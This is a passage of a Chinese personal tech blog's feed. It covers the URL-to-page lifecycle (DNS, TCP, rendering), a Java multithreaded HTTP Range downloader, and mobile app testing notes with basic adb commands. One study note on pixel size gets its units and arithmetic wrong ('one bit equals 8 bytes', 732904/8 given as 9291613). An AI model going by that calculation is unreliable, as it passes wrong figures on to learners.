href="http://[www.baidu.com](http://www.baidu.com/)。其中http为协议，[www.baidu.com](http://www.baidu.com/)为网络地址，及指出需要的资源在那台计算机上。一般网络地址可以为域名或IP地址，此处为域名。使用域名是为了方便记忆，但是为了让计算机理解这个地址还需要把它解析为IP地址。">http://[www.baidu.com](http://www.baidu.com/)。其中http为协议，[www.baidu.com](http://www.baidu.com/)为网络地址，及指出需要的资源在那台计算机上。一般网络地址可以为域名或IP地址，此处为域名。使用域名是为了方便记忆，但是为了让计算机理解这个地址还需要把它解析为IP地址。</a></p><h4 id="2-应用层DNS解析域名"><a href="#2-应用层DNS解析域名" class="headerlink" title="2.应用层DNS解析域名"></a>2.应用层DNS解析域名</h4><p>  客户端先检查本地是否有对应的IP地址，若找到则返回响应的IP地址。若没找到则请求上级DNS服务器，直至找到或到根节点。</p></li></ul><ul><li>DNS中递归查询和迭代查询的区别</li></ul><p>  1、 递归查询： 一般客户机和服务器之间属递归查询，即当客户机向DNS服务器发出请求后，若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到结果后转交客户机。</p><p>  2、 迭代查询（反复查询）： 一般DNS服务器之间属迭代查询，如：若DNS2不能响应DNS1的请求，则它会将DNS3的IP给DNS2，以便其再向DNS3发出请求。</p><p>  以一个DNS请求解析为例：</p><p>  1）用户发起域名请求到dnsA，这时dnsA有这个记录，将结果返回给用户，这个过程是递归查询。</p><p>  2）用户发起域名请求到dnsA，这时dns没有这个记录，它去向dnsB问有没有这个记录，以此类推，直到把结果返回给用户，这个过程是递归查询。</p><p>  3）用户发起域名请求到dnsA，这时dnsA没有这个记录，它告诉用户，我没有这个记录，你去问dnsB吧，这个过程是迭代查询。</p><h4 id="3-应用层客户端发送HTTP请求"><a href="#3-应用层客户端发送HTTP请求" class="headerlink" title="3.应用层客户端发送HTTP请求"></a>3.应用层客户端发送HTTP请求</h4><p>  HTTP请求包括请求报头和请求主体两个部分，其中请求报头包含了至关重要的信息，包括请求的方法（GET / POST）、目标url、遵循的协议（http / https / ftp…），返回的信息是否需要缓存，以及客户端是否发送cookie等。</p><h4 id="4-传输层TCP传输报文"><a href="#4-传输层TCP传输报文" class="headerlink" title="4.传输层TCP传输报文"></a>4.传输层TCP传输报文</h4><pre><code>位于传输层的TCP协议为传输报文提供可靠的字节流服务。它为了方便传输，将大块的数据分割成以报文段为单位的数据包进行管理，并为它们编号，方便服务器接收时能准确地还原报文信息。TCP协议通过“三次握手”等方法保证传输的安全可靠。</code></pre><p>   “三次握手”的过程是，发送端先发送一个带有SYN（synchronize）标志的数据包给接收端，在一定的延迟时间内等待接收的回复。接收端收到数据包后，传回一个带有SYN/ACK标志的数据包以示传达确认信息。接收方收到后再发送一个带有ACK标志的数据包给接收端以示握手成功。在这个过程中，如果发送端在规定延迟时间内没有收到回复则默认接收方没有收到请求，而再次发送，直到收到回复为止。</p><p>  <a href="http://images0.cnblogs.com/blog/622045/201507/020946557039933.png" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/从输入URL到显示页面经历了什么/020946560314133.png" alt="TCP"></a> </p><h4 id="5-网络层IP协议查询MAC地址"><a href="#5-网络层IP协议查询MAC地址" class="headerlink" title="5.网络层IP协议查询MAC地址"></a>5.网络层IP协议查询MAC地址</h4><pre><code>IP协议的作用是把TCP分割好的各种数据包传送给接收方。而要保证确实能传到接收方还需要接收方的MAC地址，也就是物理地址。IP地址和MAC地址是一一对应的关系，一个网络设备的IP地址可以更换，但是MAC地址一般是固定不变的。ARP协议可以将IP地址解析成对应的MAC地址。当通信的双方不在同一个局域网时，需要多次中转才能到达最终的目标，在中转的过程中需要通过下一个中转站的MAC地址来搜索下一个中转目标。</code></pre><h4 id="6-数据到达数据链路层"><a href="#6-数据到达数据链路层" class="headerlink" title="6.数据到达数据链路层"></a>6.数据到达数据链路层</h4><pre><code>在找到对方的MAC地址后，就将数据发送到数据链路层传输。这时，客户端发送请求的阶段结束</code></pre><h4 id="7-服务器接收数据"><a href="#7-服务器接收数据" class="headerlink" title="7.服务器接收数据"></a>7.服务器接收数据</h4><pre><code>接收端的服务器在链路层接收到数据包，再层层向上直到应用层。这过程中包括在运输层通过TCP协议讲分段的数据包重新组成原来的HTTP请求报文。</code></pre><h4 id="8-服务器响应请求"><a href="#8-服务器响应请求" class="headerlink" title="8.服务器响应请求"></a>8.服务器响应请求</h4><pre><code>服务接收到客户端发送的HTTP请求后，查找客户端请求的资源，并返回响应报文，响应报文中包括一个重要的信息——状态码。状态码由三位数字组成，其中比较常见的是200 OK表示请求成功。301表示永久重定向，即请求的资源已经永久转移到新的位置。在返回301状态码的同时，响应报文也会附带重定向的url，客户端接收到后将http请求的url做相应的改变再重新发送。404 not found 表示客户端请求的资源找不到。</code></pre><h4 id="9-服务器返回相应文件"><a href="#9-服务器返回相应文件" class="headerlink" title="9. 服务器返回相应文件"></a>9. 服务器返回相应文件</h4><pre><code>请求成功后，服务器会返回相应的HTML文件。接下来就到了页面的渲染阶段了。</code></pre><h3 id="二、页面渲染"><a href="#二、页面渲染" class="headerlink" title="二、页面渲染"></a>二、页面渲染</h3><pre><code>现代浏览器渲染页面的过程是这样的：解析HTML以构建DOM树 –&gt; 构建渲染树 –&gt; 布局渲染树 –&gt; 绘制渲染树。DOM树是由HTML文件中的标签排列组成，渲染树是在DOM树中加入CSS或HTML中的style样式而形成。渲染树只包含需要显示在页面中的DOM元素，像&lt;head&gt;元素或display属性值为none的元素都不在渲染树中。在浏览器还没接收到完整的HTML文件时，它就开始渲染页面了，在遇到外部链入的脚本标签或样式标签或图片时，会再次发送HTTP请求重复上述的步骤。在收到CSS文件后会对已经渲染的页面重新渲染，加入它们应有的样式，图片文件加载完立刻显示在相应位置。在这一过程中可能会触发页面的重绘或重排。</code></pre></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从输入URL到显示页面经历了什么&quot;&gt;&lt;a href=&quot;#从输入URL到显示页面经历了什么&quot; class=&quot;headerlink&quot; title=&quot;从输入URL到显示页面经历了什么?&quot;&gt;&lt;/a&gt;从输入URL到显示页面经历了什么?&lt;/h1&gt;&lt;blockquote&gt;
&lt;u
      
    
    </summary>
    
    
    
      <category term="network" scheme="https://kayleh.top/tags/network/"/>
    
  </entry>
  
  <entry>
    <title>Download</title>
    <link href="https://kayleh.top/DOWNLOAD/"/>
    <id>https://kayleh.top/DOWNLOAD/</id>
    <published>2021-03-15T09:18:07.000Z</published>
    <updated>2021-04-15T15:26:11.540Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-多线程下载器的设计与实现"><a href="#Java-多线程下载器的设计与实现" class="headerlink" title="Java 多线程下载器的设计与实现"></a>Java 多线程下载器的设计与实现</h1><p>应用并发的场景有很多，下载文件就是一个很常见的并发场景。</p><p>为什么会想写多线程下载器呢？不知道你用过 IDM（Internet Download Manager）没，我刚使用 IDM 时，就被它的下载方式吸引了。</p><p>用 IDM 下载文件时，能够直观地看到它的下载过程：固定用 N 个线程下载文件，一开始先将文件分为 N 段，每段用一个线程下载，当某一段下载完成之后，对应的线程就空闲了，此时怎么做呢？从剩余的 N - 1 段中取出最大的一段，一分为二，这样就又有了 N 段的数据，让空闲的线程去下载新划分出来的这一段。</p><p>每当有一个线程完成下载任务时，就不断从剩余的部分中划分出一段给它下载，直到整个文件的所有部分都下载完毕。</p><p>当然，文件并不能被无限地分段，IDM 会设定一个段的阈值，当剩余的最大段小于这个阈值的时候，就不再分段了给空闲的线程了，只等待活动中的所有线程下载完毕。</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/DOWNLOAD/idm.png" alt="img"></p><p>说完 IDM 的下载策略，我们大致有了思路。不过优秀的软件不是一蹴而就的，虽然我们想写出像 IDM 的下载器，但还需要从简单的实现开始，不断迭代优化。</p><p>所以我们一开始采用的策略是：固定 N 个线程，并将文件划分为 N 段，每个线程负责下载一段数据。</p><h3 id="实现步骤"><a href="#实现步骤" class="headerlink" title="实现步骤"></a>实现步骤</h3><p><strong>判断服务器是否支持断点续传</strong></p><p>首先要明确的是，多线程下载文件利用的是每个线程下载文件的一部分，那么就需要 HTTP 服务器支持请求部分数据，或者说断点续传，因此第一步需要判断目标文件是否支持断点续传。</p><p>HTTP 请求头中有一个 <code>Range</code> 字段，可以用来指定要请求的数据范围，例如我们要请求从第 10 字节到第 20 字节的数据，可以将该字段写为 <code>Range:bytes=10-20</code>。</p><p>相应的，如果 HTTP 服务器支持断点续传，那么对于指定了 <code>Range</code> 字段的请求，会返回 206 状态码。</p><p>我们用 Curl 来测试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I --header <span class="string">"Range: bytes=0-"</span> http://mirrors.163.com/debian/ls-lR.gz</span><br></pre></td></tr></table></figure><p>得到的响应：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 206 Partial Content</span><br><span class="line">Server: nginx</span><br><span class="line">Date: Wed, 25 Apr 2018 02:57:56 GMT</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line">Content-Length: 15316619</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Last-Modified: Mon, 23 Apr 2018 14:38:44 GMT</span><br><span class="line">ETag: &quot;5addeff4-e9b68b&quot;</span><br><span class="line">Content-Range: bytes 0-15316618&#x2F;15316619</span><br></pre></td></tr></table></figure><p>我们设置 <code>Range: bytes=0-</code> ，表示请求从第 0 字节到最后一字节的数据，那为什么还要指定该字段呢？这是出于两方面的原因：一是判断响应的状态码是否为 206，二是得到文件的大小。</p><p>如果服务器支持断点续传，那么我们采用多线程进行下载，如果不支持断点续传，就采用单线程下载。</p><p><strong>文件分段</strong></p><p>我们得到了文件的大小 fileSize，将其分为 N 段，则每一段的大小为 <code>fileSize / N</code>，由于文件通常不会正好被分为 N 段，因此最后一段就等于剩余的部分的大小。</p><p>我们用一个数组 endPoint 来存放每一段的起止位置，例如一个 10 B 的文件，起止范围是 0~9，如果分为 3 段下载，那么 <code>endPoint = {0, 3, 6, 10}</code>，对每段来说是左闭右开区间。</p><p>解释：对于第 i 段（i 从 0 开始）来说，从 <code>endPoint[i]</code> 开始下载，在 <code>endPoint[i + 1] - 1</code> 处停止。同理，对第 i + 1 段来说，从 <code>endPoint[i + 1]</code> 开始，在 <code>endPoint[i + 2] - 1</code> 处停止。</p><p><strong>创建下载线程</strong></p><p>我们为每一段创建一个下载线程进行下载，每一段都存放在一个单独的临时文件中。</p><p>下载线程需要做的事情可以总结如下：</p><ul><li>设置请求头的 <code>Range</code> 字段来指定请求范围</li><li>设置超时时间</li><li>连接 HTTP 服务器</li><li>创建临时文件（第一次下载该段）</li><li>读取服务器返回的数据，写入到临时文件，直到读取的字节数等于该段的大小</li><li>关闭临时文件</li></ul><p>上面是顺利下载的流程，我们还需要在出现下列问题时进行重试：</p><ul><li>如果连接时间或读取时间超时</li><li>临时文件读写出错</li></ul><p>这样又有问题了，对于该线程来说，重试时是重新下载整段，还是接着下载剩余部分？我们知道，最好就是接着下载还没下完的那部分，那如何实现呢？</p><p>我们可以这么做：每个线程保存自己负责部分的起止位置，在刚启动线程时，起止位置就是段的起止位置，创建临时文件写出已下载的数据。在下载数据时，实时更新线程的起始位置为当前已下载字节的下一个字节，当出错需要重试时，直接从该位置开始，并且写出到之前创建的临时文件中。</p><p><strong>创建监视线程</strong></p><p>我们创建一个守护线程，负责监视文件的下载进度、下载速度、当前活跃线程数，在各线程下载结束后，通知主线程做下一步处理。</p><p><strong>处理临时文件</strong></p><p>当主线程收到通知，所有部分都下载完成时，就需要对临时文件进行清理。</p><p>如果是多线程下载的文件，那么需要对多个临时文件进行合并。</p><p>如果是单线程下载的文件，则对临时文件进行重命名。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>这里给出程序的轮廓，进行整体上的介绍，完整的源码可查看 Github：<a href="https://github.com/wrayzheng/java-multithread-downloader" target="_blank" rel="noopener">https://github.com/wrayzheng/java-multithread-downloader</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpDownloader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> resumable;</span><br><span class="line">    <span class="keyword">private</span> URL url;</span><br><span class="line">    <span class="keyword">private</span> File localFile;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span>[] endPoint;</span><br><span class="line">    <span class="keyword">private</span> Object waiting = <span class="keyword">new</span> Object();</span><br><span class="line">    <span class="keyword">private</span> AtomicInteger downloadedBytes = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> AtomicInteger aliveThreads = <span class="keyword">new</span> AtomicInteger(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> multithreaded = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> fileSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> THREAD_NUM = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> TIME_OUT = <span class="number">5000</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> MIN_SIZE = <span class="number">2</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HttpDownloader</span><span class="params">(String Url, String localPath)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HttpDownloader</span><span class="params">(String Url, String localPath,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">int</span> threadNum, <span class="keyword">int</span> timeout)</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//开始下载文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">get</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检测目标文件是否支持断点续传，以决定是否开启多线程下载文件的不同部分</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">supportResumeDownload</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//监测下载速度及下载状态，下载完成时通知主线程</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startDownloadMonitor</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对临时文件进行合并或重命名</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">cleanTempFile</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//合并多线程下载产生的多个临时文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//一个下载线程负责下载文件的某一部分，如果失败则自动重试，直到下载完成</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DownloadThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> start;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> end;</span><br><span class="line">        <span class="keyword">private</span> OutputStream out;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">DownloadThread</span><span class="params">(<span class="keyword">int</span> id, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//保证文件的该部分数据下载完成</span></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//下载文件指定范围的部分</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">download</span><span class="params">()</span> </span>&#123;...&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将 DownloadThread 定义为 HttpDownloader 的内部类，这是因为一个 HttpDownloader 实例对应一个文件下载任务，该实例中存放了该任务的各种数据，而下载线程是与该任务是关联的，需要用到这些数据，因此定义为内部类可以直接共享这些数据，从而避免过多的参数传递和存储。</p><p>要下载一个文件，首先创建一个 HttpDownloader 实例，必须传入的参数是目标文件 URL 和本地的存储位置，可选参数是线程数和超时时间。</p><p>HttpDownloader 的入口方法为 get()，它的工作如下：</p><ul><li>调用 supportResumeDownload() 方法判断目标文件是否支持断点续传以及是否大于设定的文件最小值，以决定是否采取多线程的下载方式；</li><li>计算每一段的起止位置，存入 endPoint；</li><li>创建 DownloadThread 线程进行下载；</li><li>调用 startDownloadMonitor() 方法启动监视线程；</li><li>等待文件下载完毕；</li><li>调用 cleanTempFile() 处理临时文件；</li><li>输出结束信息。</li></ul><p>再来介绍一下 DownloadThread，它的入口方法是 run()，工作如下：</p><ul><li>调用 download() 方法下载指定部分的数据;</li><li>如果成功，则线程结束，如果失败，则回到上一步。</li></ul><h3 id="下载测试"><a href="#下载测试" class="headerlink" title="下载测试"></a>下载测试</h3><p>对于单个连接限速的服务器，多线程下载才能体现其优势，如果服务器本身不对连接限速，那么单个连接也能接近带宽上限。</p><p>我们来看看，对于单个连接速度远小于带宽时，单线程与多线程的对比。</p><p>首先是单个线程进行下载：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/DOWNLOAD/downloader-one-threads.gif" alt="img"></p><p>用时 54.133 秒，平均下载速度 42 KB/s。</p><p>开启 10 个线程进行下载：</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/DOWNLOAD/downloader-ten-threads.gif" alt="img"></p><p>用时 10.144 秒，平均下载速度 228 KB/s。</p><p>可以看到，相比单线程下载，开启多线程之后下载速度有了巨大的提升。</p><p>在实际下载时，根据网络状况不同，设置不同的超时时间，对下载速度也有不小的影响。如果超时时间设置过小，会导致线程频繁建立连接，而建立连接是相对耗时的操作，导致下载效率低下；如果超时时间设置过长，可能连接已经失效，而客户端却长时间等待，无谓地消耗时间。</p><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这是一个最基本的多线程下载器的实现，将文件划分为固定的 N 段，分配给 N 个线程下载，当一个线程下载完成后，该线程就随之结束了，没有被再次利用。</p><p>之后我会对该程序做进一步的优化，一方面会采取和 IDM 类似的下载策略，进一步提高下载效率，另一方面，也会在功能和鲁棒性方面进行加强，完善异常处理。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java-多线程下载器的设计与实现&quot;&gt;&lt;a href=&quot;#Java-多线程下载器的设计与实现&quot; class=&quot;headerlink&quot; title=&quot;Java 多线程下载器的设计与实现&quot;&gt;&lt;/a&gt;Java 多线程下载器的设计与实现&lt;/h1&gt;&lt;p&gt;应用并发的场景有很多
      
    
    </summary>
    
    
    
      <category term="C" scheme="https://kayleh.top/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>app test</title>
    <link href="https://kayleh.top/app-test/"/>
    <id>https://kayleh.top/app-test/</id>
    <published>2021-03-03T08:49:54.000Z</published>
    <updated>2021-04-11T17:11:28.482Z</updated>
    
    <content type="html"><![CDATA[<h2 id="移动端测试要点"><a href="#移动端测试要点" class="headerlink" title="移动端测试要点"></a>移动端测试要点</h2><h3 id="安装测试、卸载测试"><a href="#安装测试、卸载测试" class="headerlink" title="安装测试、卸载测试"></a>安装测试、卸载测试</h3><h3 id="UI测试"><a href="#UI测试" class="headerlink" title="UI测试"></a>UI测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137765268.png" alt="1615137765268" style="zoom:50%;"></p><h3 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615133542830.png" alt="1615133542830" style="zoom:50%;"></p><h4 id="运行app"><a href="#运行app" class="headerlink" title="运行app"></a>运行app</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615134963504.png" alt="1615134963504"></p><h4 id="应用的前后台切换"><a href="#应用的前后台切换" class="headerlink" title="应用的前后台切换"></a>应用的前后台切换</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615134979917.png" alt="1615134979917"></p><h4 id="免登陆"><a href="#免登陆" class="headerlink" title="免登陆"></a>免登陆</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135150085.png" alt="1615135150085"></p><h4 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135195319.png" alt="1615135195319"></p><h4 id="离线浏览"><a href="#离线浏览" class="headerlink" title="离线浏览"></a>离线浏览</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135394779.png" alt="1615135394779"></p><h4 id="app更新"><a href="#app更新" class="headerlink" title="app更新"></a>app更新</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135456332.png" alt="1615135456332"></p><h4 id="定位、照相机服务"><a href="#定位、照相机服务" class="headerlink" title="定位、照相机服务"></a>定位、照相机服务</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135477942.png" alt="1615135477942"></p><h4 id="时间测试"><a href="#时间测试" class="headerlink" title="时间测试"></a>时间测试</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135504852.png" alt="1615135504852"></p><h4 id="PUSH测试"><a href="#PUSH测试" class="headerlink" title="PUSH测试"></a>PUSH测试</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615135520679.png" alt="1615135520679">    </p><h3 id="性能测试"><a href="#性能测试" class="headerlink" title="性能测试"></a>性能测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136053666.png" alt="1615136053666" style="zoom:50%;"></p><h3 id="交叉事件测试"><a href="#交叉事件测试" class="headerlink" title="交叉事件测试"></a>交叉事件测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136213904.png" alt="1615136213904"></p><p>例如：微信视频和来电</p><h3 id="兼容性测试"><a href="#兼容性测试" class="headerlink" title="兼容性测试"></a>兼容性测试</h3><h3 id="升级、更新测试"><a href="#升级、更新测试" class="headerlink" title="升级、更新测试"></a>升级、更新测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136698549.png" alt="1615136698549" style="zoom:50%;"></p><h3 id="用户体验测试"><a href="#用户体验测试" class="headerlink" title="用户体验测试"></a>用户体验测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136880550.png" alt="1615136880550" style="zoom:50%;"></p><h3 id="硬件环境测试"><a href="#硬件环境测试" class="headerlink" title="硬件环境测试"></a>硬件环境测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615136938152.png" alt="1615136938152" style="zoom:50%;"></p><h3 id="接口测试"><a href="#接口测试" class="headerlink" title="接口测试"></a>接口测试</h3><h3 id="客户端数据库测试"><a href="#客户端数据库测试" class="headerlink" title="客户端数据库测试"></a>客户端数据库测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137461874.png" alt="1615137461874"></p><h3 id="安全测试"><a href="#安全测试" class="headerlink" title="安全测试"></a>安全测试</h3><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615137928157.png" alt="1615137928157" style="zoom:33%;"></p><h1 id="Android测试"><a href="#Android测试" class="headerlink" title="Android测试"></a>Android测试</h1><p>Android系统的基本结构</p><blockquote><p>linux内核层</p><p>Android函数库和Android运行的虚拟机</p><p>应用程序框架</p><p>应用程序</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615140074133.png" alt="1615140074133"></p><h4 id="测试术语"><a href="#测试术语" class="headerlink" title="测试术语"></a>测试术语</h4><ul><li>系 统碎片化</li><li>屏幕尺寸</li><li>分辨率</li><li>像素</li><li>网络制式</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615140333141.png" alt="1615140333141" style="zoom:33%;"></p><h5 id="像素"><a href="#像素" class="headerlink" title="像素"></a>像素</h5><p>一位=8字节</p><p>大小 1156*634 = 732904</p><p>732904/8=9291613=92K</p><p>9291613/1024=89.</p><h5 id="网络制式"><a href="#网络制式" class="headerlink" title="网络制式"></a>网络制式</h5><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615142556664.png" alt="1615142556664" style="zoom: 50%;"></p><h3 id="Android四大组件"><a href="#Android四大组件" class="headerlink" title="Android四大组件"></a>Android四大组件</h3><blockquote><p>缺一不可</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615232986341.png" alt="1615232986341" style="zoom:50%;"></p><ul><li>活动</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233173816.png" alt="1615233173816" style="zoom:33%;"></p><ul><li>服务</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233382480.png" alt="1615233382480" style="zoom:50%;"></p><ul><li>内容提供者</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233473534.png" alt="1615233473534" style="zoom: 50%;"></p><ul><li>广播接受者</li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615233720649.png" alt="1615233720649" style="zoom:50%;"></p><h2 id="Android测试环境搭建"><a href="#Android测试环境搭建" class="headerlink" title="Android测试环境搭建"></a>Android测试环境搭建</h2><h4 id="one-真机测试"><a href="#one-真机测试" class="headerlink" title=":one:真机测试"></a>:one:真机测试</h4><p>使用真实的手机测试</p><h4 id="two-安卓模拟器"><a href="#two-安卓模拟器" class="headerlink" title=":two:安卓模拟器"></a>:two:安卓模拟器</h4><h4 id="three-Android自带的模拟器"><a href="#three-Android自带的模拟器" class="headerlink" title=":three:Android自带的模拟器"></a>:three:Android自带的模拟器</h4><h4 id="four-云真机测试"><a href="#four-云真机测试" class="headerlink" title=":four:云真机测试"></a>:four:云真机测试</h4><h3 id="Android开发环境"><a href="#Android开发环境" class="headerlink" title="Android开发环境"></a>Android开发环境</h3><ul><li>安装java, jdk</li><li>ADT工具包<img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615234913928.png" alt="1615234913928" style="zoom:50%;"></li></ul><h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615309230399.png" alt="1615309230399" style="zoom: 50%;"></p><p>打开eclipse</p><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615310931766.png" alt="1615310931766" style="zoom:50%;"></p><h4 id="ADB命令"><a href="#ADB命令" class="headerlink" title="ADB命令"></a>ADB命令</h4><ul><li><h5 id="启动和关闭服务"><a href="#启动和关闭服务" class="headerlink" title="启动和关闭服务"></a>启动和关闭服务</h5></li></ul><blockquote><p>adb kill-server</p><p>adb start server</p></blockquote><ul><li><p>adb.exe connect 127.0.0.1:62001 </p></li><li><h5 id="查看设备连接情况"><a href="#查看设备连接情况" class="headerlink" title="查看设备连接情况"></a>查看设备连接情况</h5></li></ul><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn3/app-test/1615312862427.png" 